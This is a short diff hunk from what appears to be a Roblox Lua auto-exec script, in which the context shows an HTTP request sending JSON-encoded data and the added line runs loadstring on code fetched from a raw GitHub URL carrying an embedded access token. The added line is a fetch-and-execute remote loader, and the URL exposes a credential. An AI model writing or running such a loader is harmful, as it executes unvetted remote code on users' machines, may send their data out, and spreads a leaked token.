@@ -91,4 +91,4 @@ http_request({
     Body = game:GetService("HttpService"):JSONEncode(data)
 })
 
-https://raw.githubusercontent.com/Tivalls/AutoExec/refs/heads/main/Game%20checker?token=GHSAT0AAAAAAC4S7QKZJ3DOWGTA2H4KMDHQZ5RUPNQ
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tivalls/AutoExec/refs/heads/main/Game%20checker?token=GHSAT0AAAAAAC4S7QKZJ3DOWGTA2H4KMDHQZ5RUPNQ"))()
